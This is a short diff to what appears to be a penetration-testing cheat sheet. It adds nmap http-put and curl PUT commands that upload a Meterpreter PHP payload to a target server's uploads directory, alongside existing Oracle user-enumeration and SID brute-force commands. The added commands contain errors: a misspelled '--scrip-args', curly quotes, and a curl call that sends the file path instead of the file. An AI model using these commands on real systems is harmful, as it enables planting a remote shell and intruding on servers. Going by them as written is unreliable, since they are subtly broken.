@@ -46,6 +46,16 @@ nmap -n -v -sV -Pn -p 1521 --script=oracle-enum-users --script-args sid=ORCL,use
 
 nmap -n -v -sV -Pn -p 1521 --script=oracle-sid-brute X.X.X.X
 
+NMAP PUT
+=======
+nmap -sV --script http-put --scrip-args http-put.url='/uploads/meterpreter.php’,http-put.file='/root/Desktop/meterpreter.php' -p 8585 [Target IP]
+
+CURL PUT
+=======
+curl -i -X PUT -H “Content-Type: text/plain; charset=utf-8” -d “/root/Desktop/meterpreter.php” http://172.28.128.3:8585/uploads/meterpreter.php
+
+
+
 tnscmd10g version -h X.X.X.X
 tnscmd10g status -h X.X.X.X
 
